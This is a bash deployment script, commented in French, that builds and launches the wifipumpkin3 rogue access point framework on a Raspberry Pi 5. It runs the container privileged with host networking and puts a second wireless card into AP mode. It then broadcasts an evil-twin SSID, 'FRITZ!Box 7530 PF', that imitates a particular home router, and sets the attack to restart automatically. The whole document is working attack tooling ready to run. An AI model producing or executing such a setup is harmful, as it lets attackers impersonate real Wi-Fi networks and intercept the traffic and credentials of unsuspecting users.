#!/bin/bash
# Raspberry Pi 5 - Final Corrected Stack (wlan0: MGMT / wlan1: Attack)

# 1. Dockerfile (Correctif URL Git + Bypass compilation PyQt5)
cat <<DOCKER > Dockerfile
FROM python:3.11-bookworm

ENV DEBIAN_FRONTEND=noninteractive
ENV QT_QPA_PLATFORM=offscreen 

# Installation des dépendances via APT avec les bons noms (python3-openssl)
RUN apt-get update && apt-get install -y \\
    build-essential \\
    git hostapd dnsmasq iptables wireless-tools net-tools rfkill \\
    python3-pyqt5 python3-sip python3-openssl python3-scapy \\
    python3-netifaces python3-requests python3-psutil \\
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt
# URL corrigée sans espace
RUN git clone https://github.com/P0cL4bs/wifipumpkin3.git /opt/wifipumpkin3

WORKDIR /opt/wifipumpkin3
# Installation sans re-télécharger PyQt5 (déjà installé via apt)
RUN pip3 install . --break-system-packages --no-deps

WORKDIR /app
ENTRYPOINT ["wifipumpkin3", "--cli"]
DOCKER

# 2. Docker Compose (Mode Privilégié pour les cartes réseau)
cat <<COMPOSE > docker-compose.yml
services:
  wifipumpkin3:
    build: .
    container_name: wifipumpkin3
    network_mode: host
    privileged: true
    volumes:
      - .:/app
      - /dev:/dev
      - /lib/modules:/lib/modules
    environment:
      - DISPLAY=:0
      - QT_QPA_PLATFORM=offscreen
    command: ["--pulp", "/app/attack.pulp"]
    restart: unless-stopped
COMPOSE

# 3. Script d'Initialisation (Sécurité wlan0: 192.168.178.65)
cat <<INIT > init_attack.sh
#!/bin/bash
MGMT_IP="192.168.178.65"
CURRENT_SSH_IP=\$(echo \$SSH_CONNECTION | awk '{print \$3}')
[ -z "\$CURRENT_SSH_IP" ] && CURRENT_SSH_IP=\$(ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "\$CURRENT_SSH_IP" != "\$MGMT_IP" ]; then
    echo "[!!!] ERREUR : Session SSH détectée hors wlan0 (\$MGMT_IP) !"
    exit 1
fi

echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

cat <<PULP > attack.pulp
set interface wlan1
set ssid "FRITZ!Box 7530 PF"
set proxy noproxy
start
PULP

echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build
INIT

chmod +x init_attack.sh
./init_attack.sh
